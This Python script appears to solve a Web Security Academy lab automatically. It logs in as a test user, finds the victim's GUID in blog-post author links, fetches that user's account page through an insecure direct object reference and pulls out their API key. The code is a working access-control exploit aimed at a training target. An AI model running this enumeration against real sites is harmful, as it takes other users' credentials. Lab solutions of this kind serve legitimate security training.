from web_security_academy.core.logger import logger
from urllib.parse import urlencode
from bs4 import BeautifulSoup

import re


def solve_lab(session):
    session.login("wiener", "peter")

    logger.info("Attempting to find blog post written by carlos...")
    logger.toggle_newline()
    for i in range(1, 11):
        params = {"postId": i}
        resp = session.get_path("/post", params=params)

        soup = BeautifulSoup(resp.text, "lxml")
        elem = soup.select_one("#blog-author a")
        author = elem.text

        if author != "carlos":
            logger.info(f"Post #{i} by {author}")
        else:
            guid = elem.get("href").replace("/blogs?userId=", "")
            logger.success(f"Post #{i} by {author} (extracted GUID {guid})")
            logger.toggle_newline()
            break
    else:
        logger.failure("Unable to find blog post written by carlos.")
        logger.toggle_newline()

    params = {"id": guid}
    logger.info(f'Visiting "{session.url}my-account?{urlencode(params)}"...')
    resp = session.get_path("/my-account", params=params)

    if resp.status_code != 200:
        logger.failure("Unable to visit URL.")
        return

    soup = BeautifulSoup(resp.text, "lxml")
    regex = re.compile(r"Your API Key is: (.*)")
    match = soup.find(text=regex)

    if match is None:
        logger.failure("Unable to extract API key from HTTP response.")
        return
    else:
        api_key = re.match(regex, match).group(1)
        logger.success(f"API Key: {api_key}")
        session.submit_solution(api_key)
